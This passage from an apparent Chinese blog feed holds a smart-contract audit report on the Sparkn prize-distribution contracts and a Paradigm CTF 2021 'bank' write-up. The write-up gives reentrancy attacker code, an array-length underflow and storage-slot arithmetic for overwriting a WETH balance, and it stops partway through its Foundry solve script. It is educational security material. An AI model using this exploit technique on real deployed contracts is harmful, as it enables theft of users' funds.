        <content type="html"><![CDATA[<h1 id="Sparkn-2023-08-codehawks"><a href="#Sparkn-2023-08-codehawks" class="headerlink" title="Sparkn-2023-08@codehawks"></a>Sparkn-2023-08@codehawks</h1><ul><li>竞赛平台：<a href="https://www.codehawks.com/contests/cllcnja1h0001lc08z7w0orxx">codehawks</a></li><li>代码仓库：<a href="https://github.com/Cyfrin/2023-08-sparkn/tree/main">GitHub</a></li></ul><h2 id="项目意图"><a href="#项目意图" class="headerlink" title="项目意图"></a>项目意图</h2><ol><li>创造一个比赛平台，采用代理模式</li><li>人员：制造比赛的人，参加比赛的人，还有赞助比赛的人和owner。</li><li>进行比赛：每一个参赛者一个proxy存储合约，然后delegatecall逻辑合约</li><li>比赛结束之后分发奖金。</li></ol><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="1-未校验的输入参数"><a href="#1-未校验的输入参数" class="headerlink" title="1.未校验的输入参数"></a>1.未校验的输入参数</h3><ul><li>严重性：高</li><li>漏洞：owner可能会恶意将参赛员应得的奖金窃取</li><li>例子：参赛员A完成了题目，然后owner拿到它比赛的salt，领取奖金。而owner拿自己的账户作为proxy接收奖金，这是允许的，因为没有检测proxy。</li><li>修复：对Proxy进行校验，<code>require(getProxyAddress(salt, implementation) == proxy)</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function distributeByOwner(</span><br><span class="line">    address proxy, // 每一个参赛员对应一个proxy，这里作为接收奖金的地址</span><br><span class="line">    address organizer,</span><br><span class="line">    bytes32 contestId,</span><br><span class="line">    address implementation,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) public onlyOwner &#123;</span><br><span class="line">    if (proxy == address(0)) revert ProxyFactory__ProxyAddressCannotBeZero();</span><br><span class="line">    bytes32 salt = _calculateSalt(organizer, contestId, implementation);</span><br><span class="line">    if (saltToCloseTime[salt] == 0) revert ProxyFactory__ContestIsNotRegistered();</span><br><span class="line">    // distribute only when it exists and expired</span><br><span class="line">    if (saltToCloseTime[salt] + EXPIRATION_TIME &gt; block.timestamp) revert ProxyFactory__ContestIsNotExpired();</span><br><span class="line">    _distribute(proxy, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-未校验的输入参数"><a href="#2-未校验的输入参数" class="headerlink" title="2.未校验的输入参数"></a>2.未校验的输入参数</h3><ul><li>严重性：高</li><li>漏洞：任何人拿到奖金签名之后，都可以将奖金发放到任意已经注册过比赛的用户地址</li><li>例子：参赛员A完成了比赛并且比赛已经结束，我拿到了A的奖金签名帮助他发放奖金，通过了ECDSA.recover验证之后，我设置implementation为参赛员B的地址，那么B就窃取了A的奖金</li><li>修复：对implementation进行校验，<code>require(getProxyAddress(salt, implementation) == proxy)</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function deployProxyAndDistributeBySignature(</span><br><span class="line">    address organizer,</span><br><span class="line">    bytes32 contestId,</span><br><span class="line">    address implementation,</span><br><span class="line">    bytes calldata signature,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) public returns (address) &#123;</span><br><span class="line">    bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(contestId, data)));</span><br><span class="line">    if (ECDSA.recover(digest, signature) != organizer) revert ProxyFactory__InvalidSignature();</span><br><span class="line">    </span><br><span class="line">    bytes32 salt = _calculateSalt(organizer, contestId, implementation); // 漏洞</span><br><span class="line">    </span><br><span class="line">    if (saltToCloseTime[salt] == 0) revert ProxyFactory__ContestIsNotRegistered();</span><br><span class="line">    if (saltToCloseTime[salt] &gt; block.timestamp) revert ProxyFactory__ContestIsNotClosed();</span><br><span class="line">    address proxy = _deployProxy(organizer, contestId, implementation);</span><br><span class="line">    _distribute(proxy, data);</span><br><span class="line">    return proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-未校验的输入参数"><a href="#3-未校验的输入参数" class="headerlink" title="3.未校验的输入参数"></a>3.未校验的输入参数</h3><ul><li>严重性：高</li><li>漏洞：如果winner设置为0地址，那么分配的奖金将会丢失，错误的发送到0地址</li><li>例子：<code>address[] memory winners</code>中的一个地址设置为0地址，那么此次奖金分配也是成功的，因为没有任何地方对winners的元素进行了0地址检验</li><li>修复：在<code>_distribute()</code>遍历数组元素的时候，增加<code>require(winners[i] != address(0));</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function _distribute(address token, address[] memory winners, uint256[] memory percentages, bytes memory data)</span><br><span class="line">    internal</span><br><span class="line">&#123;</span><br><span class="line">    // token address input check</span><br><span class="line">    if (token == address(0)) revert Distributor__NoZeroAddress();</span><br><span class="line">    if (!_isWhiteListed(token)) &#123;</span><br><span class="line">        revert Distributor__InvalidTokenAddress();</span><br><span class="line">    &#125;</span><br><span class="line">    // winners and percentages input check</span><br><span class="line">    if (winners.length == 0 || winners.length != percentages.length) revert Distributor__MismatchedArrays();</span><br><span class="line">    uint256 percentagesLength = percentages.length;</span><br><span class="line">    uint256 totalPercentage;</span><br><span class="line">    for (uint256 i; i &lt; percentagesLength;) &#123;</span><br><span class="line">        totalPercentage += percentages[i];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // check if totalPercentage is correct</span><br><span class="line">    if (totalPercentage != (10000 - COMMISSION_FEE)) &#123;</span><br><span class="line">        revert Distributor__MismatchedPercentages();</span><br><span class="line">    &#125;</span><br><span class="line">    IERC20 erc20 = IERC20(token);</span><br><span class="line">    uint256 totalAmount = erc20.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">    // if there is no token to distribute, then revert</span><br><span class="line">    if (totalAmount == 0) revert Distributor__NoTokenToDistribute();</span><br><span class="line"></span><br><span class="line">    uint256 winnersLength = winners.length; // cache length</span><br><span class="line">    for (uint256 i; i &lt; winnersLength;) &#123;</span><br><span class="line">        uint256 amount = totalAmount * percentages[i] / BASIS_POINTS;</span><br><span class="line">        erc20.safeTransfer(winners[i], amount);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send commission fee as well as all the remaining tokens to STADIUM_ADDRESS to avoid dust remaining</span><br><span class="line">    _commissionTransfer(erc20);</span><br><span class="line">    emit Distributed(token, winners, percentages, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-未校验的返回值"><a href="#4-未校验的返回值" class="headerlink" title="4.未校验的返回值"></a>4.未校验的返回值</h3><ul><li>严重性：低</li><li>漏洞：CREATE2创建合约的时候，并没有对返回值proxy进行校验。项目在审计时的版本，由于proxy合约较小，失败的概率很小，但也是有可能的，后续的升级后，proxy合约也许会变大则更容易失败，然后proxy就会是address(0)。造成的后果是本次分发奖金失败，并且交易不会revert，消耗了更多的gas，暂时不会有其他损失。用户只需再次调用<code>_distribute()</code>直到成功即可。</li><li>例子：<ul><li>第一步：发送奖金到计算好的proxy地址，然后第二步调用分发奖金的时候，proxy失败得到一个address(0)，那么执行分发<code>_deployProxy()</code>的是时候，<code>.call()</code>就会失败</li><li>不过没关系啊，奖金并没有留在address(0)，它是存在于计算好的正确的proxy地址(尚未成功部署)</li><li>第二步：我们提高gas，再次调用<code>distribute()</code>分发，合约就会被部署出来，奖金一样会被分发，并不会永远丢失</li></ul></li><li>修复：可以增加一个返回值检验：<code>if (proxy == address(0)) revert ProxyFactory_ProxyDeploymentFailed(proxy);</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function _deployProxy(address organizer, bytes32 contestId, address implementation) internal returns (address) &#123;</span><br><span class="line">    bytes32 salt = _calculateSalt(organizer, contestId, implementation);</span><br><span class="line">    address proxy = address(new Proxy&#123;salt: salt&#125;(implementation));</span><br><span class="line">    return proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-验证不严"><a href="#5-验证不严" class="headerlink" title="5.验证不严"></a>5.验证不严</h3><ul><li>严重性：中等</li><li>漏洞：<code>_distribute()</code>分发奖金的时候，并没有让其他人对winners和percentages进行校验。造成的问题是如果winners和percentage写错了或者存在恶意的嫌疑，这么没人能阻止。</li><li>例子：我在分发奖金的时候winners和percentage写的不对，或者我想作恶，导致了winners的奖金受到影响</li><li>修复：增加一个第三方对这次的调用进行校验，校验winners和percentage。有点像转移owner权限的时候，设置ownerPending，而不是直接转移，让新的owner自己去接收。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function _distribute(address token, address[] memory winners, uint256[] memory percentages, bytes memory data) internal&#123;</span><br><span class="line">...</span><br><span class="line">    for (uint256 i; i &lt; winnersLength;) &#123;</span><br><span class="line">        uint256 amount = totalAmount * percentages[i] / BASIS_POINTS;</span><br><span class="line">        erc20.safeTransfer(winners[i], amount);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-未校验的输入参数"><a href="#6-未校验的输入参数" class="headerlink" title="6.未校验的输入参数"></a>6.未校验的输入参数</h3><ul><li>严重性：低</li><li>漏洞：未对implementation进行校验，此项目中implementation应该是一个合约</li><li>例子：如果部署的时候，不小心将用一个EOA账户赋给implementation，那么就无法达到预期目的</li><li>修复：增加implementation是否是合约的检测</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">    address implementation = _implementation;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        let ptr := mload(0x40)</span><br><span class="line">        calldatacopy(ptr, 0, calldatasize())</span><br><span class="line">        let result := delegatecall(gas(), implementation, ptr, calldatasize(), 0, 0)</span><br><span class="line">        let size := returndatasize()</span><br><span class="line">        returndatacopy(ptr, 0, size)</span><br><span class="line"></span><br><span class="line">        switch result</span><br><span class="line">        case 0 &#123; revert(ptr, size) &#125;</span><br><span class="line">        default &#123; return(ptr, size) &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-未校验的参数"><a href="#7-未校验的参数" class="headerlink" title="7.未校验的参数"></a>7.未校验的参数</h3><ul><li>严重性：低</li><li>漏洞1：未对amount和percentages进行校验，那么存在分发0元奖金的情况。有些奇怪的ERC20代币并不支持发送0元，他会revert，从而导致整个交易失败<ul><li>例子：这个奇怪的代币是LEND，不支持发送0元</li><li>修复：增加对amount数额的判断，发送0元则revert</li></ul></li><li>漏洞2：当获奖者是位于黑名单中的，那么所有的获奖者都会受到影响，无法获取奖金，DoS<ul><li>例子：我是USDT黑名单的用户，我为了搞破坏，也参加了这个比赛，然后我获奖了，当发送奖金给我的时候，无法成功，因为USDT把我拉进黑名单，任何USDT都无法转入我的地址</li><li>修复：此项目增加一个添加黑名单的功能，一旦出现因为黑名单转账失败的问题，也把它拉进黑名单</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint256 winnersLength = winners.length; // cache length</span><br><span class="line">for (uint256 i; i &lt; winnersLength;) &#123;</span><br><span class="line">    uint256 amount = totalAmount * percentages[i] / BASIS_POINTS;</span><br><span class="line">    erc20.safeTransfer(winners[i], amount);</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-owner权限转移"><a href="#8-owner权限转移" class="headerlink" title="8.owner权限转移"></a>8.owner权限转移</h3><ul><li>严重性：低</li><li>漏洞：引入了openzeppelin的owner库，它的转移机制是直接转移，如果转错了地址就寄了。恰巧，此项目的owner拥有绝对的权限，一旦丢失，项目崩溃</li><li>例子：略</li><li>修复：换用openzeppelin的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol">Ownable2Step</a>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;Ownable&#125; from &quot;openzeppelin/access/Ownable.sol&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 21.audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.bank</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/11.bank/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/11.bank/</url>
      
        <content type="html"><![CDATA[<h1 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>Setup：初始化题目</li><li>Bank<ul><li>ERC20Like：接口</li><li>Bank<ul><li>存款系统，一个用户可以拥有多个account，每个account可以存入多种代币，可以类比成metamask。</li><li>存取款、关闭最新的account、更新account的名字</li><li>owner更换机制</li></ul></li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>让bank的WETH数量归零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">       return weth.balanceOf(address(bank)) == 0;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="3-1发掘漏洞"><a href="#3-1发掘漏洞" class="headerlink" title="3.1发掘漏洞"></a>3.1发掘漏洞</h4><p>先分析资产和状态情况：</p><div class="table-container"><table><thead><tr><th></th><th>ETH</th><th>WETH</th><th>授权</th><th>状态</th></tr></thead><tbody><tr><td>Setup</td><td></td><td></td><td>WETH：=&gt;Bank, max</td><td></td></tr><tr><td>Bank</td><td></td><td>50</td><td></td><td>owner=Setup, deposit[Setup]=50WETH</td></tr><tr><td>WETH</td><td></td><td></td><td></td></tr></tbody></table></div><p>一看这道题，就知道是考点在于转账（代码量足够少，能出问题的地方不多）。</p><ul><li>先来看看可能有问题的方法<ul><li>bank合约的owner转让两个方法是没有操作空间的。不可行。</li><li><code>setAccountName()</code>和<code>closeLastAccount()</code>：虽然<code>closeLastAccount()</code>可以使数组长度减小，但没有外部调用因此不可能重入，也就不可能使其向下溢出。不可行。</li><li>那么存取款函数是肯定有问题的<ul><li>将条件检查的代码去掉，剩下主体可以发现，先转账，后检查状态，很明显的重入。</li><li>存款函数虽然可以重入，但是用垃圾token利用自己实现的<code>transferFrom()</code>进行重入，重入增加的数量只是垃圾token，并不会影响到WETH。不可行。</li><li>取款函数：用垃圾token利用自己实现的<code>transfer()</code>进行重入，由于版本小于0.8.0，因此重入之后accounts数组下溢导致数组大小覆盖整个storage，然后我们就可以利用<code>setAccountName()</code>来修改任何数据。</li></ul></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function depositToken(uint accountId, address token, uint amount) external &#123;</span><br><span class="line"></span><br><span class="line">    .....</span><br><span class="line">    </span><br><span class="line">    account.balances[token] += amount;</span><br><span class="line">    </span><br><span class="line">    uint beforeBalance = ERC20Like(token).balanceOf(address(this));</span><br><span class="line">    require(ERC20Like(token).transferFrom(msg.sender, address(this), amount), &quot;depositToken/transfer-failed&quot;);</span><br><span class="line">    </span><br><span class="line">    uint afterBalance = ERC20Like(token).balanceOf(address(this));</span><br><span class="line">    require(afterBalance - beforeBalance == amount, &quot;depositToken/fee-token&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawToken(uint accountId, address token, uint amount) external &#123;</span><br><span class="line">.....</span><br><span class="line">    account.balances[token] -= amount;</span><br><span class="line"></span><br><span class="line">    if (account.balances[token] == 0) &#123;</span><br><span class="line">        account.uniqueTokens--;</span><br><span class="line"></span><br><span class="line">        if (account.uniqueTokens == 0 &amp;&amp; accountId == lastAccount) &#123;</span><br><span class="line">            accounts[msg.sender].length--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint beforeBalance = ERC20Like(token).balanceOf(msg.sender);</span><br><span class="line">    require(ERC20Like(token).transfer(msg.sender, amount), &quot;withdrawToken/transfer-failed&quot;);</span><br><span class="line">    uint afterBalance = ERC20Like(token).balanceOf(msg.sender);</span><br><span class="line">    require(afterBalance - beforeBalance == amount, &quot;withdrawToken/fee-token&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2利用漏洞"><a href="#3-2利用漏洞" class="headerlink" title="3.2利用漏洞"></a>3.2利用漏洞</h4><p><strong>1.重入取款函数使得下溢</strong></p><p>可以在三个函数<code>balanceOf()</code>, <code>transferFrom()</code>, <code>transfer()</code>可以作为重入，需要选择在合适的方法合适的位置进行重入才能使得数组长度下溢，这是因为取款函数使数组长度减少是有条件的<code>account.uniqueTokens == 0 &amp;&amp; accountId == lastAccount</code>。经过数次尝试，下面的重入逻辑是可行的：左边的数字是重入方法执行的次序，[]中的内容是程序执行过程中全局变量的状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[len=0, uniqueTokens=0]</span><br><span class="line">1.depositToken(0, address(this), 0): </span><br><span class="line">[len=1, uniqueTokens=1]</span><br><span class="line">2.withdrawToken(0, address(this), 0) len=1, uniqueTokens=1</span><br><span class="line">[len=1, uniqueTokens=1]</span><br><span class="line">3.depositToken(0, address(this), 0)  len=1, uniqueTokens=1</span><br><span class="line">[len=1, uniqueTokens=1]</span><br><span class="line">4.withdrawToken(0, address(this), 0) len=1, uniqueTokens=1</span><br><span class="line">[len=0, uniqueTokens=0]</span><br><span class="line">3.depositToken(0, address(this), 0)  len=0, uniqueTokens=1</span><br><span class="line">[len=0, uniqueTokens=1]</span><br><span class="line">2.withdrawToken(0, address(this), 0) len=-1, uniqueTokens=0</span><br><span class="line">[len=-1, uniqueTokens=0]</span><br><span class="line">1.depositToken(0, address(this), 0): len=-1, uniqueTokens=0</span><br><span class="line">[len=-1, uniqueTokens=0]</span><br></pre></td></tr></table></figure><p>配套的方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address) public returns(uint256)&#123;</span><br><span class="line">      if(count01 == 0)&#123;</span><br><span class="line">           count01++;</span><br><span class="line">           return 0;</span><br><span class="line">      &#125;else if(count01 == 1)&#123;</span><br><span class="line">           count01++;</span><br><span class="line">           bank.withdrawToken(0, address(this), 0);</span><br><span class="line">           return 0;</span><br><span class="line">      &#125;else if(count01 == 2)&#123;</span><br><span class="line">           count01++;</span><br><span class="line">           bank.depositToken(0, address(this), 0);</span><br><span class="line">           return 0;</span><br><span class="line">      &#125;else if(count01 == 3)&#123;</span><br><span class="line">           count01++;</span><br><span class="line">           bank.withdrawToken(0, address(this), 0);</span><br><span class="line">           return 0;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">           return 0;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   function transferFrom(address, address, uint256) public returns(bool)&#123;return true;&#125;</span><br><span class="line">   function transfer(address, uint256) public returns(bool)&#123;return true;&#125;</span><br></pre></td></tr></table></figure><p><strong>2.找到位置，修改内容</strong></p><p>既然我们成功修改了数组大小为无穷，那么我们就可以修改Bank的所有内容，通过<code>setAccountName()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct Account &#123;</span><br><span class="line">    string accountName;</span><br><span class="line">    uint uniqueTokens;</span><br><span class="line">    mapping(address =&gt; uint) balances;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mapping(address =&gt; Account[]) accounts;</span><br><span class="line"></span><br><span class="line">function setAccountName(uint accountId, string name) external &#123;</span><br><span class="line">    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);</span><br><span class="line">    </span><br><span class="line">    accounts[msg.sender][accountId].accountName = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只能修改accountName，我们需要找到我们在bank合约中记录WETH余额记录的位置，然后修改为50WETH，就可以取走50WETH了。但这是一个复杂的结构体，因此要找位置便有点麻烦。下面是找到第n个account对应WETH余额存储的位置：</p><ul><li>找到Account[]长度的位置：<code>a = keccak256(bytes32(msg.sender)+bytes32(0x02))</code></li><li>找到第一个Account的初始位置：<code>b = keccak256(bytes32(a))</code></li><li>找到第n个Account，即accountId为0：<code>c = keccak256(b) + 3*n</code></li><li>找到第n个Account的WETH对应的余额：<ul><li><code>d = c + 2</code></li><li><code>e = keccak256(bytes32(WETH)+bytes32(d))</code></li></ul></li></ul><p>找到第n个account对应WETH余额存储的位置<code>e</code>之后，因为我们的方法之后修改结构体的第一个参数，因此我们需要比较一下看看第n个account能不能刚好覆盖WETH余额的位置，如果不行，则换下一个account：</p><p><img src="https://moe.photo/images/2023/08/18/paradigm2021bank.png" alt></p><p>找到刚好能够覆盖的account，则修改WETH余额，再withdraw那个account。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line">import &quot;./setupBytecode.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant WETH9_Artifact = &#x27;out/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    IWETH9 public weth;</span><br><span class="line">    ISetup public level;</span><br><span class="line">    IBank public bank;</span><br><span class="line">    uint256 public count01 = 0;</span><br><span class="line">    uint256 public count02 = 0;</span><br><span class="line"> </span><br><span class="line">    function setUp() public payable&#123;</span><br><span class="line">        // 部署</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);</span><br><span class="line">        vm.startBroadcast(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));</span><br><span class="line"></span><br><span class="line">        weth = IWETH9(deployHelper_weth(WETH9_Artifact));</span><br><span class="line">        level = ISetup(deployHelper_Setup(address(weth)));</span><br><span class="line">        bank = IBank(level.bank());</span><br><span class="line"></span><br><span class="line">        vm.label(address(weth),&quot;weth&quot;);</span><br><span class="line">        vm.label(address(level),&quot;level&quot;);</span><br><span class="line">        vm.label(address(bank),&quot;bank&quot;);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span 